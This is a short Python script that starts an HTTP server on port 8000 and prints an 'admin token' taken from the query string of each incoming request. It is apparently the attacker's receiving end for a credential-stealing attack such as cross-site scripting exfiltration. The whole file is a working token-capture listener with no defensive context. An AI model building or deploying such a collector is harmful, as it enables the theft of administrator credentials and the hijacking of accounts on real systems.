from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class TokenCollector(BaseHTTPRequestHandler):
    def do_GET(self):
        print("\n=== Captured Admin Token ===")
        token = urllib.parse.unquote(self.path.split('?')[1])
        print(f"Token: {token}")
        print("==========================")
        
        self.send_response(200)
        self.end_headers()

print("[+] Starting token collector on port 8000...")
HTTPServer(('0.0.0.0', 8000), TokenCollector).serve_forever()